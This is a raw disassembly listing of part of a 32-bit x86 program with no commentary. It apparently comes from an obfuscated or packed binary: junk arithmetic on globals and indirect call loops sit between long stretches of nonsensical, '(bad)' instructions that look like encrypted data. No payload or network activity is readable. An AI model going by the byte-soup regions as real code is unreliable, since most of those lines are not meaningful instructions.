  40e7e5:	outs   dx,BYTE PTR ds:[esi]
  40e7e6:	fiadd  DWORD PTR [ecx-0x62]
  40e7e9:	inc    eax
  40e7ea:	dec    edx
  40e7eb:	scas   al,BYTE PTR es:[edi]
  40e7ec:	mov    eax,ds:0x4cc407b1
  40e7f1:	lds    esi,FWORD PTR [ebx-0x304d716e]
  40e7f7:	cli    
  40e7f8:	sbb    DWORD PTR [ebx+0x2378cb3a],0xffffff85
  40e7ff:	push   edi
  40e800:	push   0xffffff98
  40e802:	and    DWORD PTR [edx+ebp*8],ebp
  40e805:	mov    edi,0xb6c94bc
  40e80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e80b:	adc    ecx,DWORD PTR [ebp+0x10]
  40e80e:	(bad)  
  40e80f:	in     eax,0xed
  40e811:	test   BYTE PTR [eax],bl
  40e813:	pop    esp
  40e814:	cli    
  40e815:	fisub  DWORD PTR [edi]
  40e817:	lea    edx,[ebp+0x52]
  40e81a:	test   ebx,0xb493843b
  40e820:	fcmovb st,st(4)
  40e822:	xor    BYTE PTR [esi],ch
  40e824:	add    eax,0x28132e09
  40e829:	aaa    
  40e82a:	mov    dl,0x29
  40e82c:	sub    eax,0x3b754715
  40e831:	leave  
  40e832:	sbb    BYTE PTR [ebx-0x16ea7f00],cl
  40e838:	cld    
  40e839:	inc    edx
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	jbe    0x40e8ef
  40e94b:	icebp  
  40e94c:	shl    DWORD PTR [eax+eiz*4],0x70
  40e950:	jo     0x40e915
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e935
  40e956:	dec    eax
  40e957:	fistp  DWORD PTR [esp+edx*4-0x61]
  40e95b:	ror    dh,1
  40e95d:	cs ret 
  40e95f:	rcl    DWORD PTR [ebx-0x42df47ac],cl
  40e965:	(bad)  
  40e966:	rcr    BYTE PTR [esi+0x7e],cl
  40e969:	mov    esi,0x76c1e633
  40e96e:	cmc    
  40e96f:	and    eax,0xc7742f14
  40e974:	adc    eax,0x8f6671b2
  40e979:	test   eax,0x54e8044e
  40e97e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e97f:	lea    esi,[edx-0x17c5fa55]
  40e985:	push   esi
  40e986:	jae    0x40ea05
  40e988:	arpl   WORD PTR [esi+eax*8-0x34724812],ax
  40e98f:	mov    bl,0x96
  40e991:	mov    edx,ecx
  40e993:	push   ebp
  40e994:	(bad)  
  40e995:	nop
  40e996:	in     eax,0xfa
  40e998:	out    0x8e,eax
  40e99a:	(bad)  
  40e99b:	mov    al,ds:0xdd7197df
  40e9a0:	retf   0xbca3
  40e9a3:	push   es
  40e9a4:	mov    ds:0x67946eac,eax
  40e9a9:	inc    ebx
  40e9aa:	test   bh,0x27
  40e9ad:	fs inc edi
  40e9af:	sahf   
  40e9b0:	jno    0x40e971
  40e9b2:	jmp    0x40e98d
  40e9b4:	std    
  40e9b5:	add    al,0xba
  40e9b7:	xor    esp,DWORD PTR [edi-0x37c4b90f]
  40e9bd:	cmp    ebp,DWORD PTR [ecx-0x3007fb3c]
  40e9c3:	cmp    al,0xc
  40e9c5:	sbb    BYTE PTR [ebp-0xb],ah
  40e9c8:	push   esi
  40e9c9:	xchg   esi,eax
  40e9ca:	push   ecx
  40e9cb:	mov    eax,0x5d7c48aa
  40e9d0:	cmp    eax,0x20e85d7b
  40e9d5:	mov    ebp,DWORD PTR [edi-0x5fe4351d]
  40e9db:	dec    esi
  40e9dc:	outs   dx,DWORD PTR ds:[esi]
  40e9dd:	mov    BYTE PTR [eax+esi*4-0x27],ah
  40e9e1:	sets   BYTE PTR [ebx+eax*1-0x7aa01fd2]
  40e9e9:	add    al,al
  40e9eb:	out    dx,eax
  40e9ec:	jno    0x40e96e
  40e9ee:	jmp    0xf60113cb
  40e9f3:	rcl    DWORD PTR [edi+0x1a],cl
  40e9f6:	push   ebp
  40e9f7:	mov    ecx,eax
  40e9f9:	dec    ebp
  40e9fa:	xchg   ecx,esi
  40e9fc:	dec    edx
  40e9fd:	jmp    0x40e9e9
  40e9ff:	or     al,0x5
  40ea01:	mov    esp,0x368a2901
  40ea06:	push   ebp
  40ea07:	and    DWORD PTR [eax],esp
  40ea09:	test   DWORD PTR [ecx-0x63],esi
  40ea0c:	js     0x40e9fa
  40ea0e:	fisubr WORD PTR [eax+0x406b2d56]
  40ea14:	imul   edi,DWORD PTR [ecx],0x10
  40ea17:	repz add DWORD PTR [esi+0x28],esp
  40ea1b:	fistp  DWORD PTR [eax-0x27]
  40ea1e:	adc    eax,0xadfa45c0
  40ea23:	xchg   ecx,eax
  40ea24:	cwde   
  40ea25:	icebp  
  40ea26:	fisubr WORD PTR [esi]
  40ea28:	int    0x8e
  40ea2a:	fwait
  40ea2b:	pop    ebp
  40ea2c:	mov    ah,0xf0
  40ea2e:	cwde   
  40ea2f:	add    ebp,DWORD PTR [ebx+ebp*2]
  40ea32:	arpl   WORD PTR [eax-0x15],dx
  40ea35:	test   eax,0x72056c26
  40ea3a:	jnp    0x40ea16
  40ea3c:	and    eax,0x12182eaf
  40ea41:	cdq    
  40ea42:	into   
  40ea43:	jg     0x40ea26
  40ea45:	push   ebx
  40ea46:	mov    BYTE PTR [eax+0x42],ch
  40ea49:	add    esp,DWORD PTR [ecx+0x55786e6d]
  40ea4f:	js     0x40ea75
  40ea51:	or     DWORD PTR [eax+eax*4-0xc76a290],esp
  40ea58:	pop    esp
  40ea59:	sbb    edx,DWORD PTR [eax+0x20]
  40ea5c:	sub    edx,eax
  40ea5e:	lods   eax,DWORD PTR ds:[esi]
  40ea5f:	out    0xeb,al
  40ea61:	mov    dh,0xb0
  40ea63:	inc    ebp
  40ea64:	pop    ebp
  40ea65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea66:	mov    dh,0x9
  40ea68:	ins    DWORD PTR es:[edi],dx
  40ea69:	push   esi
  40ea6a:	xor    BYTE PTR [edx+ebp*8],0x88
  40ea6e:	pop    es
  40ea6f:	pop    ecx
  40ea70:	xor    ch,BYTE PTR [ebx]
  40ea72:	adc    bl,BYTE PTR ds:0xd9b4e4f4
  40ea78:	out    0xe,eax
  40ea7a:	or     cl,BYTE PTR [ecx]
  40ea7c:	lea    ebx,[edi]
  40ea7e:	adc    DWORD PTR [ecx],esi
  40ea80:	lahf   
  40ea81:	cmp    al,0x93
  40ea83:	pop    ecx
  40ea84:	leave  
  40ea85:	jmp    0x40eb05
  40ea87:	mul    DWORD PTR [ebx-0x1d159241]
  40ea8d:	dec    edi
  40ea8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8f:	imul   esi,DWORD PTR [ecx],0xffffffc8
  40ea92:	scas   eax,DWORD PTR es:[edi]
  40ea93:	fmul   st(0),st
  40ea95:	mov    ah,0x4b
  40ea97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea98:	jl     0x40eb0c
  40ea9a:	xchg   ecx,eax
  40ea9b:	sub    edi,ecx
  40ea9d:	jne    0x40eafb
  40ea9f:	adc    DWORD PTR [ecx],edx
  40eaa1:	jmp    0xe76fb5
  40eaa6:	add    BYTE PTR [eax],al
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fce5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xa2
  40eb8d:	pop    ds
  40eb8e:	jecxz  0x40eb14
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	ret    
  40eb99:	(bad)  
  40eb9a:	mov    gs,WORD PTR [esi]
  40eb9c:	(bad)  
  40eb9d:	call   0xfd7e:0x583e164c
  40eba4:	mov    ch,0xf1
  40eba6:	xor    al,0x3
  40eba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba9:	dec    ebp
  40ebaa:	dec    edi
  40ebab:	inc    ebx
  40ebac:	xchg   edx,eax
  40ebad:	mov    edx,0x41e92732
  40ebb2:	xchg   edi,eax
  40ebb3:	ss aaa 
  40ebb5:	and    eax,0xdf269983
  40ebba:	ja     0x40ec27
  40ebbc:	xor    ecx,edx
  40ebbe:	out    dx,eax
  40ebbf:	inc    ecx
  40ebc0:	adc    BYTE PTR [ebx-0x3a],ah
  40ebc3:	sbb    ebx,DWORD PTR [eax+0x40]
  40ebc6:	cmp    al,0xf8
  40ebc8:	xor    eax,0xb9cb9a7a
  40ebcd:	and    eax,DWORD PTR [eax+0x253a1c39]
  40ebd3:	xchg   edx,eax
  40ebd4:	xor    DWORD PTR [edi-0x7],edi
  40ebd7:	lds    eax,FWORD PTR ds:0x1c05
  40ebdc:	pop    esi
  40ebdd:	jnp    0x40ebda
  40ebdf:	xchg   ebp,eax
  40ebe0:	and    ch,bh
  40ebe2:	mov    eax,ds:0x9302d14d
  40ebe7:	fisub  WORD PTR [ebx+0x44]
  40ebea:	(bad)  
  40ebeb:	fild   DWORD PTR [ebp-0xc683b0b]
  40ebf1:	fnsave [edx-0x70]
  40ebf4:	push   ecx
  40ebf5:	dec    esi
  40ebf6:	jb     0x40ec18
  40ebf8:	enter  0xf990,0x83
  40ebfc:	outs   dx,DWORD PTR ds:[esi]
  40ebfd:	test   eax,0x7541b6d1
  40ec02:	cmp    bl,BYTE PTR [eax+edi*2]
  40ec05:	add    BYTE PTR [eax],ah
  40ec07:	fs pop esp
  40ec09:	das    
  40ec0a:	adc    al,0x7d
  40ec0c:	adc    DWORD PTR [ebx+0x5],edx
  40ec0f:	mov    bl,0xd7
  40ec11:	pop    eax
  40ec12:	pop    edx
  40ec13:	clc    
  40ec14:	aas    
  40ec15:	fcmovb st,st(2)
  40ec17:	add    BYTE PTR [ecx-0x68],cl
  40ec1a:	mov    ebx,DWORD PTR [eax-0x11]
  40ec1d:	(bad)  
  40ec1e:	cwde   
  40ec1f:	cmp    esi,DWORD PTR [edi+edx*2-0x4b45adc0]
  40ec26:	cmp    BYTE PTR [eax+0x3ba525a4],bl
  40ec2c:	popa   
  40ec2d:	dec    ecx
  40ec2e:	in     eax,0x9d
  40ec30:	xor    eax,0x246f982
  40ec35:	mov    bh,0x10
  40ec37:	add    eax,0xd2a84db3
  40ec3c:	jp     0x40ec37
  40ec3e:	sbb    al,0xb7
  40ec40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec42:	iret   
  40ec43:	and    al,0x26
  40ec45:	clc    
  40ec46:	rcr    DWORD PTR [edx+0x65bea78d],1
  40ec4c:	xor    esi,ecx
  40ec4e:	push   DWORD PTR [ecx-0x2c]
  40ec51:	and    cl,bl
  40ec53:	mov    BYTE PTR [ebx+0x16aa5f0a],dl
  40ec59:	cs push eax
  40ec5b:	in     al,0xd4
  40ec5d:	lea    edx,[edx-0xc00ca02]
  40ec63:	push   0x6f8ac497
  40ec68:	sub    DWORD PTR [edx],edx
  40ec6a:	jp     0x40ec2e
  40ec6c:	jno    0x40ec57
  40ec6e:	(bad)  
  40ec70:	mov    BYTE PTR [edx+esi*1+0x39],ah
  40ec74:	adc    eax,0x99308332
  40ec79:	adc    al,0x9c
  40ec7b:	nop
  40ec7c:	iret   
  40ec7d:	mov    WORD PTR [esi],fs
  40ec7f:	sub    cl,ch
  40ec81:	mov    BYTE PTR [edx+ebp*4+0x21b573d9],ch
  40ec88:	push   0xffffffe5
  40ec8a:	stos   BYTE PTR es:[edi],al
  40ec8b:	jmp    0x7541:0xe7feff55
  40ec92:	push   ss
  40ec93:	aaa    
  40ec94:	jbe    0x40ec8e
  40ec96:	pusha  
  40ec97:	(bad)  
  40ec98:	pop    ds
  40ec99:	gs nop
  40ec9b:	add    BYTE PTR [eax+0x4794f7db],cl
  40eca1:	aad    0x46
  40eca3:	dec    eax
  40eca4:	ret    
  40eca5:	and    DWORD PTR [eax+0x4499c8b8],edx
  40ecab:	lahf   
  40ecac:	mov    cl,0x51
  40ecae:	pop    ecx
  40ecaf:	int3   
  40ecb0:	jmp    eax
  40ecb2:	jmp    0xf461884
  40ecb7:	nop
  40ecb8:	je     0x40eca1
  40ecba:	mov    cl,0x92
  40ecbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecbd:	xor    BYTE PTR [ebp+ebx*4-0x4a19d390],0xf4
  40ecc5:	fld    TBYTE PTR [eax+0x654e3121]
  40eccb:	test   al,0x9
  40eccd:	adc    al,0xa4
  40eccf:	xchg   edi,eax
  40ecd0:	in     al,dx
  40ecd1:	outs   dx,BYTE PTR ds:[esi]
  40ecd2:	sbb    al,0x45
  40ecd4:	aas    
  40ecd5:	shr    BYTE PTR [ebx-0x54],cl
  40ecd8:	(bad)  
  40ecd9:	loope  0x40ed23
  40ecdb:	and    eax,0x309e18b7
  40ece0:	in     al,0x4
  40ece2:	int    0x48
  40ece4:	adc    bh,BYTE PTR [ebx]
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecf2
  40ed00:	popa   
  40ed01:	mov    ecx,0x70aebaba
  40ed06:	jo     0x40eccb
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed83
  40ed0c:	mov    dl,0x40
  40ed0e:	aad    0x5d
  40ed10:	add    cl,dh
  40ed12:	xchg   ecx,eax
  40ed13:	jbe    0x40ed12
  40ed15:	pop    ss
  40ed16:	cmp    ebx,DWORD PTR [edx]
  40ed18:	ins    DWORD PTR es:[edi],dx
  40ed19:	mov    ah,0xc9
  40ed1b:	js     0x40ed8f
  40ed1d:	or     al,0x29
  40ed1f:	dec    edi
  40ed20:	pop    ebx
  40ed21:	mov    ebx,0xac88181d
  40ed26:	rcr    DWORD PTR [ecx-0x7ac25dd4],cl
  40ed2c:	pop    esi
  40ed2d:	or     eax,0x2be3f0e1
  40ed32:	aad    0xab
  40ed34:	jbe    0x40ed6e
  40ed36:	jecxz  0x40eccb
  40ed38:	or     BYTE PTR [bx+0x28],ah
  40ed3c:	scas   eax,DWORD PTR es:[edi]
  40ed3d:	mov    ecx,0xaa8c97b1
  40ed42:	jg     0x40ed4e
  40ed44:	es lock ds dec edx
  40ed48:	push   ecx
  40ed49:	xchg   esp,eax
  40ed4a:	push   ds
  40ed4b:	mov    dh,0x86
  40ed4d:	dec    eax
  40ed4e:	mov    dh,0xf4
  40ed50:	dec    eax
  40ed51:	mov    ebx,0xe7bc8604
  40ed56:	dec    eax
  40ed57:	shl    BYTE PTR [edi+edx*8+0x2e],0x22
  40ed5c:	cli    
  40ed5d:	mov    WORD PTR [edi-0x3f],cs
  40ed60:	(bad)  
  40ed61:	leave  
  40ed62:	out    0x2d,al
  40ed64:	xchg   esi,eax
  40ed65:	dec    ebp
  40ed66:	xor    edx,ecx
  40ed68:	mov    eax,ds:0x91aa9b2
  40ed6d:	into   
  40ed6e:	ins    BYTE PTR es:[edi],dx
  40ed6f:	push   ss
  40ed70:	leave  
  40ed71:	(bad)  
  40ed72:	loope  0x40edb3
  40ed74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed75:	ret    
  40ed76:	push   es
  40ed77:	pop    ebx
  40ed78:	pop    eax
  40ed79:	jnp    0x40ed70
  40ed7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed7c:	and    al,BYTE PTR ds:0x9ea9e732
  40ed82:	jb     0x40ede5
  40ed84:	pop    ds
  40ed85:	push   0x7ad49504
  40ed8a:	loopne 0x40ed8c
  40ed8c:	ins    DWORD PTR es:[edi],dx
  40ed8d:	jmp    0x40ed8e
  40ed8f:	lock fimul DWORD PTR [edi-0x69]
  40ed93:	mov    ch,BYTE PTR [esi]
  40ed95:	jl     0x40ed18
  40ed97:	out    0x17,eax
  40ed99:	test   BYTE PTR [eax],dl
  40ed9b:	mov    ah,0xb3
  40ed9d:	lods   al,BYTE PTR ds:[esi]
  40ed9e:	or     al,0x72
  40eda0:	loop   0x40ed80
  40eda2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eda3:	in     eax,0xd3
  40eda5:	jp     0x40edaf
  40eda7:	sub    eax,0xc1e510ea
  40edac:	pop    edx
  40edad:	pop    ds
  40edae:	into   
  40edaf:	cmp    al,0x90
  40edb1:	pop    ebp
  40edb2:	jle    0x40ed53
  40edb4:	mov    bl,0xb6
  40edb6:	dec    edx
  40edb7:	inc    edx
  40edb8:	retf   0xd38b
  40edbb:	mov    bh,0x27
  40edbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edbe:	mov    edx,0x2c3c16ed
  40edc3:	cmp    al,0xb6
  40edc5:	or     dh,BYTE PTR [ebx]
  40edc7:	call   0x312027d1
  40edcc:	test   DWORD PTR [edi-0x58ecb93a],ecx
  40edd2:	add    eax,DWORD PTR [eax-0x6e]
  40edd5:	add    DWORD PTR [eax-0x4614b641],eax
  40eddb:	hlt    
  40eddc:	adc    al,0x73
  40edde:	addr16 sbb eax,0x9ff930e4
  40ede4:	repnz push ebp
  40ede6:	jbe    0x40ed93
  40ede8:	test   eax,0x2d9647c5
  40eded:	xor    eax,0x9e920ec
  40edf2:	enter  0xc2b7,0x3e
  40edf6:	lea    edx,[ebp+eiz*2+0x21f080e2]
  40edfd:	scas   al,BYTE PTR es:[edi]
  40edfe:	in     al,dx
  40edff:	jns    0x40ed9d
  40ee01:	jmp    0x40ee79
  40ee03:	mov    al,BYTE PTR [ebx-0x1f]
  40ee06:	cld    
  40ee07:	cmp    bl,al
  40ee09:	or     BYTE PTR [eax-0x24],al
  40ee0c:	push   ebp
  40ee0d:	in     eax,0xf9
  40ee0f:	femms  
  40ee11:	pusha  
  40ee12:	or     al,0xb5
  40ee14:	scas   eax,DWORD PTR es:[edi]
  40ee15:	mov    WORD PTR [edi+0x49],es
  40ee18:	sub    BYTE PTR [ebx-0x57b680ea],dl
  40ee1e:	push   0x6de20f02
  40ee23:	les    ecx,FWORD PTR [ecx]
  40ee25:	test   DWORD PTR [edx+0x35f97718],esp
  40ee2b:	sbb    BYTE PTR [edx-0xbac39f5],cl
  40ee31:	cmp    eax,0xc2c23d5d
  40ee36:	mov    esp,0xa4e53814
  40ee3b:	sbb    BYTE PTR [edx-0x16d45ea1],ah
  40ee41:	repnz fcomi st,st(3)
  40ee44:	xor    DWORD PTR [edi-0x5f],ebp
  40ee47:	out    0x51,eax
  40ee49:	xor    al,0x92
  40ee4b:	test   al,0xfa
  40ee4d:	test   al,0x67
  40ee4f:	cmp    eax,0x9cbf4535
  40ee54:	inc    edi
  40ee55:	sti    
  40ee56:	(bad)  
  40ee57:	xor    BYTE PTR [edi],cl
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x1a
  40ee7f:	push   eax
  40ee80:	jge    0x40eeec
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eeac
  40ee8b:	rcr    edx,cl
  40ee8d:	je     0x40ee1f
  40ee8f:	in     al,dx
  40ee90:	ret    0xd945
  40ee93:	aaa    
  40ee94:	iret   
  40ee95:	test   al,0xd0
  40ee97:	inc    ebp
  40ee98:	fwait
  40ee99:	adc    DWORD PTR [edi-0x2d849ed6],ebp
  40ee9f:	stos   DWORD PTR es:[edi],eax
  40eea0:	ret    
  40eea1:	push   ds
  40eea2:	out    dx,al
  40eea3:	test   al,0x94
  40eea5:	add    BYTE PTR [eax],0x92
  40eea8:	mov    eax,0xa239a65e
  40eead:	lea    ebp,[esi+0x13]
  40eeb0:	xor    edx,eax
  40eeb2:	loopne 0x40ee3f
  40eeb4:	mov    edx,0xff3c126b
  40eeb9:	stc    
  40eeba:	loop   0x40ee5a
  40eebc:	sti    
  40eebd:	test   DWORD PTR [ebp-0x34],0x30006360
  40eec4:	inc    eax
  40eec5:	loop   0x40ef45
  40eec7:	jns    0x40eed2
  40eec9:	mov    ebx,0x52f03341
  40eece:	out    dx,al
  40eecf:	(bad)  
  40eed0:	out    0xcf,eax
  40eed2:	jns    0x40eeaa
  40eed4:	ficomp WORD PTR [eax-0x7564f174]
  40eeda:	add    esp,DWORD PTR [edx+0x2c]
  40eedd:	or     DWORD PTR [ebx+0x78],esp
  40eee0:	cs pop dx
  40eee3:	(bad)  [ecx+0x15b3171b]
  40eee9:	clc    
  40eeea:	jmp    0x40eead
  40eeec:	cli    
  40eeed:	sbb    DWORD PTR [eax+0x27],edi
  40eef0:	jecxz  0x40ef06
  40eef2:	stc    
  40eef3:	push   ecx
  40eef4:	popa   
  40eef5:	rol    BYTE PTR [esi-0x6b7ae79a],cl
  40eefb:	sub    al,0x2a
  40eefd:	xor    eax,0x87cd6be5
  40ef02:	adc    eax,0x2de4a1fb
  40ef07:	mov    ebx,DWORD PTR [edi-0x5d6e4bf]
  40ef0d:	xchg   edi,eax
  40ef0e:	or     BYTE PTR [esi+0x12],dl
  40ef11:	ins    BYTE PTR es:[edi],dx
  40ef12:	(bad)  [eax-0x80]
  40ef15:	bound  ebp,QWORD PTR [ebx-0x6f]
  40ef18:	pop    ss
  40ef19:	js     0x40ef06
  40ef1b:	int    0xb
  40ef1d:	mov    ah,0x15
  40ef1f:	cli    
  40ef20:	bound  esi,QWORD PTR [esi-0x12]
  40ef23:	int    0x7e
  40ef25:	fucom  st(3)
  40ef27:	push   edx
  40ef28:	in     al,dx
  40ef29:	nop
  40ef2a:	dec    esi
  40ef2b:	mov    BYTE PTR [edx-0x74],al
  40ef2e:	ds ins BYTE PTR es:[edi],dx
  40ef30:	dec    edi
  40ef31:	xor    BYTE PTR [ebp+0x766ca68c],bh
  40ef37:	sbb    ebx,esi
  40ef39:	ror    DWORD PTR [esi],0xb7
  40ef3c:	les    ebp,FWORD PTR [ebx+0x7b]
  40ef3f:	jg     0x40efc0
  40ef41:	cli    
  40ef42:	sbb    dl,BYTE PTR [ecx+edx*2]
  40ef45:	loop   0x40ef77
  40ef47:	in     al,0xd1
  40ef49:	add    eax,0x56d275d1
  40ef4e:	pop    ds
  40ef4f:	xchg   BYTE PTR [esi],bh
  40ef51:	sbb    sp,WORD PTR [ebx-0x2d]
  40ef55:	inc    edx
  40ef56:	ret    
  40ef57:	and    eax,0xcd3d9cb9
  40ef5c:	ret    0x10b6
  40ef5f:	std    
  40ef60:	cdq    
  40ef61:	inc    eax
  40ef62:	jle    0x40ef2d
  40ef64:	lods   al,BYTE PTR ds:[esi]
  40ef65:	test   bl,bh
  40ef67:	icebp  
  40ef68:	outs   dx,DWORD PTR ds:[esi]
  40ef69:	(bad)
  40ef6c:	dec    edi
  40ef6d:	jp     0x40efcb
  40ef6f:	mov    ds:0xd9a241b6,al
  40ef74:	or     BYTE PTR [ebx],dh
  40ef76:	test   DWORD PTR [eax],0xf3d3e181
  40ef7c:	pop    ebx
  40ef7d:	sbb    BYTE PTR [esi+0x2492fa5b],bh
  40ef83:	jmp    0xe60f:0x7efd48ed
  40ef8a:	jle    0x40efa7
  40ef8c:	jl     0x40efdb
  40ef8e:	add    ebx,DWORD PTR [ecx+0x756df3ab]
  40ef94:	clc    
  40ef95:	jmp    0xe00b1273
  40ef9a:	scas   eax,DWORD PTR es:[edi]
  40ef9b:	outs   dx,DWORD PTR ds:[esi]
  40ef9c:	loope  0x40ef3c
  40ef9e:	add    eax,0x983cfed6
  40efa3:	lods   eax,DWORD PTR ds:[esi]
  40efa4:	mov    bh,0xc7
  40efa6:	test   DWORD PTR [eax],eax
  40efa8:	fild   WORD PTR [eax]
  40efaa:	mov    BYTE PTR [edi+0x4a],ch
  40efad:	int3   
  40efae:	jns    0x40ef90
  40efb0:	jne    0x40f023
  40efb2:	gs fcmovnb st,st(1)
  40efb5:	jmp    0x40ef3c
  40efb7:	and    bh,dl
  40efb9:	push   es
  40efba:	dec    ebx
  40efbb:	(bad)  
